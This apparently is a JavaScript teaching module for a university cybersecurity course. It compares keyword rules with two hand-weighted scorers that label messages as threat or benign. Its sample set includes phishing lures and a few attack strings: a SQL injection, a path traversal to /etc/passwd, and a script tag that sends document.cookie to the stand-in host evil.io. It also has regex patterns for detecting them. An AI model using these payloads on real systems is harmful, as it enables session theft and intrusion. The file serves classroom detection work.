// ISOM 5160 Day 1 slides 21, 27, 28: text in → label out.
// A toy comparison of fixed keyword rules, a generic "pretrained" scorer and a cyber-"finetuned" scorer.
// Weights are illustrative (hand-set), not a real model; the point is the shape of the problem.

export const TRIAGE_FEATURES = [
  { id: "urgent", label: "催促 / 威胁", re: /urgent|immediately|within 24 ?h|suspend|locked|today/i },
  { id: "cred", label: "要账号密码", re: /password|credential|log ?in|verify your|account/i },
  { id: "click", label: "叫你点链接", re: /click|link|claim/i },
  { id: "money", label: "钱 / 礼品卡", re: /gift card|wire|pay|fee|refund|invoice|free iphone/i },
  { id: "short", label: "短链接", re: /bit\.ly|tinyurl|t\.co\//i },
  { id: "ipurl", label: "IP 直连网址", re: /https?:\/\/\d+\.\d+\.\d+\.\d+/ },
  { id: "lookalike", label: "仿冒域名", re: /hkust-secure|paypa1|micr0soft|-login\./i },
  { id: "sqli", label: "SQL 注入", re: /'\s*or\s*1\s*=\s*1|union\s+select|drop\s+table/i },
  { id: "xss", label: "脚本注入", re: /<script|onerror\s*=|javascript:/i },
  { id: "path", label: "路径穿越", re: /\.\.\/|\/etc\/passwd/i },
  { id: "safe", label: "日常 / 培训语气", re: /never share|reminder|training|meeting|lunch|agenda|nist/i },
];

// Fixed rules: flag if any keyword appears. No score, no notion of "how sure".
export const TRIAGE_RULE_WORDS = ["password", "verify", "urgent", "click"];

export const TRIAGE_MODELS = {
  pretrained: {
    label: "Pretrained（通用垃圾邮件模型）",
    bias: -1.5,
    w: { urgent: 1.2, cred: 1.0, click: 0.8, money: 1.0, short: 0.6, ipurl: 0.3, lookalike: 0, sqli: 0, xss: 0, path: 0, safe: -0.6 },
  },
  finetuned: {
    label: "Finetuned（用带标签的网安数据调过）",
    bias: -1.8,
    w: { urgent: 1.4, cred: 1.1, click: 0.7, money: 1.2, short: 2.0, ipurl: 2.2, lookalike: 2.4, sqli: 3.5, xss: 3.5, path: 3.5, safe: -2.2 },
  },
};

export const TRIAGE_SAMPLES = [
  { text: "URGENT: your account will be suspended. Click here to verify your password", y: "threat", kind: "钓鱼邮件" },
  { text: "Please confirm your credentials within 24h at http://hkust-secure-login.com", y: "threat", kind: "钓鱼（换了说法）" },
  { text: "Your parcel is on hold. Pay the fee at http://45.77.12.9/pay", y: "threat", kind: "风险网址" },
  { text: "bit.ly/3xYz free iPhone, claim now", y: "threat", kind: "风险网址" },
  { text: "Buy 5 gift cards for the CEO and send me the codes today", y: "threat", kind: "CEO 诈骗 (BEC)" },
  { text: "' OR 1=1 --", y: "threat", kind: "攻击字符串" },
  { text: "<script>fetch('http://evil.io/?c='+document.cookie)</script>", y: "threat", kind: "攻击字符串" },
  { text: "GET /download?file=../../etc/passwd", y: "threat", kind: "攻击字符串" },
  { text: "Hi, it's Peter from finance. Can you send me the Q3 payroll file? I'm on my phone", y: "threat", kind: "社交工程（没有任何特征词）" },
  { text: "Your HKUST password expires today. Log in to the usual ITSO portal to change it", y: "benign", kind: "真的 IT 通知（但很像钓鱼）" },
  { text: "IT reminder: never share your password with anyone, including IT staff", y: "benign", kind: "安全培训" },
  { text: "Click the link in the agenda to join the Zoom meeting", y: "benign", kind: "日常邮件" },
  { text: "Team lunch moved to Friday 12:30", y: "benign", kind: "日常邮件" },
  { text: "Invoice INV-2291 attached as discussed in our meeting", y: "benign", kind: "日常邮件" },
  { text: "NIST CSF functions: Govern, Identify, Protect, Detect, Respond, Recover", y: "benign", kind: "框架文字" },
];

export const TRIAGE_LABEL = { threat: "Threat", benign: "Benign" };

export const triageFeatures = (text) => TRIAGE_FEATURES.filter((f) => f.re.test(text)).map((f) => f.id);

export function ruleVerdict(text) {
  const hits = TRIAGE_RULE_WORDS.filter((w) => text.toLowerCase().includes(w));
  return { label: hits.length ? "threat" : "benign", hits };
}

export function modelScore(text, modelId) {
  const m = TRIAGE_MODELS[modelId];
  const feats = triageFeatures(text);
  const z = feats.reduce((acc, f) => acc + (m.w[f] ?? 0), m.bias);
  return { score: 1 / (1 + Math.exp(-z)), feats };
}

// method: "rules" | "pretrained" | "finetuned". band: half-width of the "person decides" zone around the threshold.
export function classify(text, method, threshold = 0.5, band = 0.2) {
  if (method === "rules") {
    const r = ruleVerdict(text);
    return { label: r.label, score: null, review: false, why: r.hits.length ? `命中关键词 ${r.hits.join(", ")}` : "一个关键词都没命中" };
  }
  const { score, feats } = modelScore(text, method);
  const why = feats.length ? feats.map((f) => TRIAGE_FEATURES.find((x) => x.id === f).label).join(" + ") : "没有任何特征";
  return { label: score >= threshold ? "threat" : "benign", score, review: Math.abs(score - threshold) < band, why };
}

export function evaluate(method, threshold = 0.5, band = 0.2, samples = TRIAGE_SAMPLES) {
  const rows = samples.map((s) => ({ ...s, ...classify(s.text, method, threshold, band) }));
  const c = { tp: 0, fp: 0, fn: 0, tn: 0 };
  for (const r of rows) {
    const key = r.label === "threat" ? (r.y === "threat" ? "tp" : "fp") : r.y === "threat" ? "fn" : "tn";
    c[key]++;
  }
  return { rows, ...c, correct: c.tp + c.tn, total: rows.length, review: rows.filter((r) => r.review).length };
}
